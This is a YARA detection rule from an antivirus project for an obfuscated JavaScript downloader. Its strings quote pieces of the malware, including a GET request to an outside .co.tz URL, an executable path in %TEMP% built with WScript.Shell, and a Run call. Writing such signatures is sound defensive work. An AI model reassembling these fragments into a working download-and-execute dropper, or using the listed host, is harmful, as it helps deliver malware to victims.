rule sig_20160328_90aa173a3fc37b6a9675371a17811760 {
  meta:
    description = "datamaliciousorder - file 20160328_90aa173a3fc37b6a9675371a17811760.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "699aed0538660ca4a3cf43cc8accda279adbdad94104f375e4fa5b012b423fae"

  strings:
    $s1  = "function Syxneptvk() {return Enxpfu[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"O1qbiTu6IMp7T8o.exe\";};" fullword ascii
    $s2  = "do {WScript[Nwzmddpx](Gkotl() * 11)} while (Udjtp[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Enxpfu = function Orokgmp() {return WScript[Txmvyno](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Exqcypw(Xbgmldwql, Zcgspjw){return Xbgmldwql - Zcgspjw;};" fullword ascii
    $s5  = "Udjtp[Pxrtzbfyq](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s6  = "function Grtlpnptpa(Bkswcjtpa){Enxpfu[\"Run\"](Bkswcjtpa, Wnqsklyrl, Wnqsklyrl);};" fullword ascii
    $s7  = "function Eiqarydzu() {return ((Goqbyob == true) && (Goqbyob == Omelokn)) ? 1 : Wnqsklyrl;};" fullword ascii
    $s8  = "return Exqcypw(Libycszswk, Epdynmwau);" fullword ascii
    $s9  = " while (Zvkfs){" fullword ascii
    $s10 = "function Gkotl(){return 22;};" fullword ascii
    $s11 = "function Rckmrgevc(Isjcle) {var Zqnflyr = (1, 2, 3, 4, 5, Isjcle); return Zqnflyr;};" fullword ascii
    $s12 = "Omelokn = true; " fullword ascii
    $s13 = "var Hkyaazz = new this[\"Date\"]();" fullword ascii
    $s14 = "var Ttkbihkzl = false;" fullword ascii
    $s15 = "function Mrwjwtwpq(){return Sikky;};" fullword ascii
    $s16 = "Goqbyob = true; " fullword ascii
    $s17 = "function Criyouqg(){return Txmvyno;};" fullword ascii
    $s18 = "var Omelokn = false;" fullword ascii
    $s19 = "function Rhtadblrle()" fullword ascii
    $s20 = "var Goqbyob = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}